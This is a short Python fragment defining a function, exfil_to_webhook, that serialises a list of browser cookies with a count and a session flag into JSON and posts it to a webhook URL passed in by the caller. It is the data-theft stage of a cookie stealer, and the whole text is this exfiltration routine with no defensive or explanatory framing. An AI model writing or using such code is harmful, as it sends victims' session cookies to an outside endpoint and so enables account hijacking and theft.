import requests, json

def exfil_to_webhook(cookies, webhook_url):
    payload = {
        "cookies": cookies,
        "count": len(cookies),
        "session": True,
    }
    headers = {"Content-Type": "application/json"}
    requests.post(webhook_url, headers=headers, data=json.dumps(payload))
